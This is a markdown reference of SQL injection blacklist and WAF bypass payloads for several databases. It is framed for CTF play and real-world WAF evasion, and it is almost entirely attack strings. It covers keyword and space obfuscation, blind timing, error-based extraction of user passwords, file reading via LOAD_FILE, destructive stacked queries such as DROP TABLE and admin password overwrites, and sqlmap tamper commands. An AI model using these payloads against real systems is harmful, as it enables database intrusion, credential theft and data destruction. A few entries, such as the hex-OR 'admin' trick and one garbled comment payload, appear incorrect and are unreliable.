# SQL Injection Blacklist Bypass — Complete Reference

> Scope: MySQL, PostgreSQL, SQLite, MSSQL — focusing on filter bypass techniques used in CTF and real-world WAF evasion.

---

## 1. Quick Diagnosis

Inject these to confirm SQLi exists:

```sql
' OR '1'='1
" OR "1"="1
' UNION SELECT null,null-- -
' AND 1=1-- -
' AND 1=2-- -
' OR SLEEP(5)-- -          # Time-based
' OR pg_sleep(5)-- -        # PostgreSQL
```

> **Pro tip**: If quotes are filtered, try numeric payloads: `1 AND 1=1`, `1 OR 1=1`.

---

## 2. Space Bypass (空格绕过)

When the literal space `0x20` is filtered by WAF or application logic.

| Technique | Works in | Example |
|-----------|----------|---------|
| `/**/` | MySQL, MSSQL | `SELECT/**/1,2,3` |
| `%0b` (vertical tab) | MySQL | `SELECT%0B1,2,3` |
| `%0c` (form feed) | MySQL | `SELECT%0C1,2,3` |
| `%0d` (carriage return) | MySQL | `SELECT%0D1,2,3` |
| `%0a` (newline) | MySQL | `SELECT%0A1,2,3` |
| `%09` (tab) | MySQL | `SELECT%091,2,3` |
| `()` parenthesization | All | `SELECT(1),2,3` |
| Backtick string | MySQL | `` `table_name` `` |

> **MySQL-specific**: `/**/` is the most reliable space substitute in MySQL. `/*!50000SELECT*/` is a MySQL version comment that **executes** the code inside.

---

## 3. Keyword Blacklist Bypass (关键字绕过)

### 3.1 `UNION` / `SELECT` Filtered

#### Technique A: Case Variation
```sql
uNiOn SeLeCt 1,2,3
UNIoN SELeCT 1,2,3
```
> Works when filter is case-sensitive (no `/i` regex flag).

#### Technique B: Inline Comments
```sql
UN/**/ION SEL/**/ECT 1,2,3
UN%0bION SEL%0bECT 1,2,3
```

#### Technique C: MySQL Version Comments
```sql
/*!50000UNION*/ /*!50000SELECT*/ 1,2,3
```
> The `50000` means "execute if MySQL version >= 5.0.0". Use `/*!UNION*/` for unconditional execution.

#### Technique D: Double URL Encoding
```
?id=1 %252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/1,2,3
```

### 3.2 `OR` / `AND` Filtered

```sql
' || '1'='1          # MySQL, PostgreSQL, Oracle
' && '1'='1          # MySQL
' %26%26 '1'='1      # URL-encoded &&
' %7C%7C '1'='1      # URL-encoded ||
```

Alternative logic operators:
```sql
' XOR '1'='1         # XOR: true if operands differ
' Xor '1'='1
```

### 3.3 `SLEEP` / `BENCHMARK` Filtered (Time-based blind)

MySQL alternatives:
```sql
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -
' AND (SELECT * FROM (SELECT(BENCHMARK(10000000,MD5(1))))a)-- -
' AND IF(1=1,(SELECT COUNT(*) FROM information_schema.tables A, information_schema.tables B, information_schema.tables C),0)-- -
```

PostgreSQL alternatives:
```sql
' AND pg_sleep(5)-- -
' AND (SELECT 1 FROM pg_sleep(5))-- -
```

SQLite alternatives:
```sql
' AND randomblob(500000000)-- -
' AND randomblob(1000000000)-- -
```

### 3.4 `information_schema` Filtered

MySQL alternatives to enumerate tables/columns:
```sql
# Table names from sys schema (MySQL 5.7+)
SELECT table_name FROM sys.x$schema_table_statistics

# From performance_schema
SELECT table_name FROM performance_schema.table_io_waits_summary_by_table

# Using mysql.innodb_table_stats
SELECT table_name FROM mysql.innodb_table_stats

# Direct file reading (if secure_file_priv allows)
SELECT LOAD_FILE('/var/www/html/config.php')
```

### 3.5 `CONCAT` / `GROUP_CONCAT` Filtered

```sql
# MySQL
CONCAT_WS(0x7c, username, password)      # 0x7c = |
MAKE_SET(1, username, password)
EXPORT_SET(1, username, password)

# String concatenation via arithmetic
SELECT 0x6164 | 0x6d696e   # 'admin' via hex OR
```

---

## 4. String/Quote Bypass (引号绕过)

When single quotes `'` and double quotes `"` are filtered.

### 4.1 Hex Literals (MySQL)
```sql
SELECT 0x666c6167           -- hex for 'flag'
SELECT 0x61646d696e         -- hex for 'admin'
```

### 4.2 `CHAR()` / `CHR()` Functions
```sql
# MySQL
SELECT CHAR(102,108,97,103)    -- 'flag'

# PostgreSQL
SELECT CHR(102)||CHR(108)||CHR(97)||CHR(103)

# MSSQL
SELECT CHAR(102)+CHAR(108)+CHAR(97)+CHAR(103)
```

### 4.3 `CONCAT()` with Numbers
```sql
SELECT CONCAT(0x66, 0x6c, 0x61, 0x67)   -- MySQL
```

### 4.4 `0x` String Prefix (MySQL)
```sql
SELECT * FROM users WHERE username = 0x61646d696e   -- 'admin'
```

---

## 5. Comma Filtered (逗号绕过)

When `,` is filtered, `LIMIT 0,1` and `UNION SELECT 1,2,3` break.

### 5.1 `LIMIT` without comma
```sql
LIMIT 1 OFFSET 0
LIMIT 1 OFFSET 1
```

### 5.2 `UNION SELECT` without comma (JOIN)
```sql
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```

### 5.3 `SUBSTR` without comma
```sql
SUBSTR('flag' FROM 1 FOR 1)     -- MySQL
SUBSTRING('flag' FROM 1 FOR 1)  -- PostgreSQL
```

---

## 6. Equals Sign `=` Filtered (等号绕过)

```sql
# Comparison operators
' OR 1 LIKE 1-- -
' OR 1 RLIKE 1-- -          # MySQL regex match
' OR 1 REGEXP 1-- -         # MySQL
' OR 1 BETWEEN 1 AND 1-- -
' OR 1 IN (1)-- -
' OR 1 <> 0-- -             # Not equal (returns true)

# GREATEST / LEAST
' OR GREATEST(1,1)=1-- -
```

---

## 7. WAF Bypass Techniques

### 7.1 Comment Injection (注释干扰)

```sql
'/**/UNION/**/SELECT/**/1,2,3--
'/*!50000UNION*/SELECT/*!500001*/,2,3--
' UnI /**/ On SeL /**/ eCt 1,2,3--
```

### 7.2 Null Byte Injection
```
?id=1%00' UNION SELECT 1,2,3--
```

### 7.3 HTTP Parameter Pollution (HPP)
```
?id=1&id=' UNION SELECT 1,2,3--
```
> Some WAFs only check the first `id`, while the backend concatenates both.

### 7.4 Unicode Normalization
```
?id=１'ＵＮＩＯＮ ＳＥＬＥＣＴ 1,2,3--
```
> Fullwidth characters may be normalized by the database driver.

### 7.5 JSON / Array Parameters
```
?id[]=' UNION SELECT 1,2,3--
?id={'a':"' UNION SELECT 1,2,3--"}
```

---

## 8. Error-Based Extraction (报错注入)

When you can see SQL error messages.

### 8.1 MySQL Error-Based
```sql
' AND extractvalue(1, concat(0x7c, (SELECT password FROM users LIMIT 1), 0x7c))-- -
' AND updatexml(1, concat(0x7c, (SELECT password FROM users LIMIT 1), 0x7c), 1)-- -
```

### 8.2 PostgreSQL Error-Based
```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INTEGER)-- -
```

### 8.3 MSSQL Error-Based
```sql
' AND 1=@@version-- -
' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users))-- -
```

---

## 9. Stacked Queries (堆叠查询)

When the backend supports multiple queries per request.

```sql
'; DROP TABLE users; --
'; INSERT INTO users VALUES ('admin', 'password'); --
'; UPDATE users SET password='pwned' WHERE username='admin'; --
'; CREATE TABLE pwned (data TEXT); INSERT INTO pwned SELECT password FROM users; --
```

> **Note**: PHP `mysqli_multi_query()` supports this. PDO with `prepare()` usually does NOT.

---

## 10. SQLMap Tamper Scripts Reference

Common tamper scripts for WAF bypass:

```bash
sqlmap -u "http://target/?id=1" --tamper=space2comment,between,charencode
sqlmap -u "http://target/?id=1" --tamper=space2plus,percentage
sqlmap -u "http://target/?id=1" --tamper=randomcase,space2randomblank
sqlmap -u "http://target/?id=1" --tamper=multiplespaces,between
```

| Tamper Script | Description |
|---------------|-------------|
| `space2comment` | Replaces spaces with `/**/` |
| `space2plus` | Replaces spaces with `+` |
| `space2randomblank` | Replaces spaces with random whitespace chars |
| `between` | Replaces `>` with `NOT BETWEEN 0 AND #` |
| `charencode` | URL-encodes all characters |
| `randomcase` | Randomizes case of keywords |
| `multiplespaces` | Adds multiple spaces |
| `base64encode` | Base64-encodes the payload |
| `hex2char` | Replaces hex strings with CHAR() |
| `modsecurityversioned` | Embeds payload in versioned comments |

---

## 11. Real CTF Examples

| Challenge | Filter | Bypass |
|-----------|--------|--------|
| [SQLi-Labs] Less-25 | `OR`, `AND` | `\|\|`, `&&` |
| [SQLi-Labs] Less-26 | spaces | `%0b`, `%0c`, `%0d`, `%0a` |
| [SQLi-Labs] Less-27 | `UNION`, `SELECT` | `/*!50000UNION*/`, `/*!50000SELECT*/` |
| [HCTF 2018] WarmUp | `flag` keyword | Hex encoding: `0x666c6167` |
| [GXYCTF2019] BabySQli | `or`, `and`, `=`, `union` | `||`, `LIKE`, `/*!50000UNION*/` |
| [SWPU2019] Web1 | `information_schema` | `sys.x$schema_table_statistics` |
